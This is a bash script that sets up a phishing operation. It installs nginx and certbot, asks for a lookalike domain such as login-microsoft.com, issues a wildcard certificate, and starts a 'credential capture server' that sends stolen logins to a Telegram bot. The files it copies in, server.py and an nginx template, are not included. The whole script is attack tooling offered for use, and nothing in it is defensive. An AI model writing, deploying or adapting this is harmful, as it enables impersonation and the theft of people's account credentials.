#!/bin/bash

# Ensure the script is run as root
if [[ $EUID -ne 0 ]]; then
   echo "❌ This script must be run as root!" 
   exit 1
fi

# Update system and install dependencies
echo "🔄 Installing dependencies..."
apt update && apt install -y nginx certbot python3 python3-pip unzip curl

# Prompt for domain and Telegram details
echo "🔹 Enter your phishing domain (e.g., login-microsoft.com):"
read DOMAIN
echo "🔹 Enter your Telegram Bot Token:"
read TELEGRAM_BOT_TOKEN
echo "🔹 Enter your Telegram Chat ID:"
read TELEGRAM_CHAT_ID

# Configure Nginx Reverse Proxy
echo "🔧 Configuring Nginx..."
cp nginx.conf.template /etc/nginx/sites-available/$DOMAIN
sed -i "s/YOUR_DOMAIN/$DOMAIN/g" /etc/nginx/sites-available/$DOMAIN
ln -s /etc/nginx/sites-available/$DOMAIN /etc/nginx/sites-enabled/

# Restart Nginx
systemctl restart nginx

# Issue Wildcard SSL
echo "🔐 Issuing SSL certificate for $DOMAIN..."
certbot --nginx -d $DOMAIN -d *.$DOMAIN --non-interactive --agree-tos -m admin@$DOMAIN

# Create Python Server to Capture Credentials
echo "📝 Creating credential capture server..."
cp server.py /opt/server.py
sed -i "s/YOUR_TELEGRAM_BOT_TOKEN/$TELEGRAM_BOT_TOKEN/g" /opt/server.py
sed -i "s/YOUR_TELEGRAM_CHAT_ID/$TELEGRAM_CHAT_ID/g" /opt/server.py

# Install Python dependencies
echo "📦 Installing Python dependencies..."
pip3 install -r requirements.txt

# Start Python Server
echo "🚀 Starting credential capture server..."
nohup python3 /opt/server.py &

# Display final phishing URL
echo "✅ Setup complete! Your phishing site is live at: https://$DOMAIN"
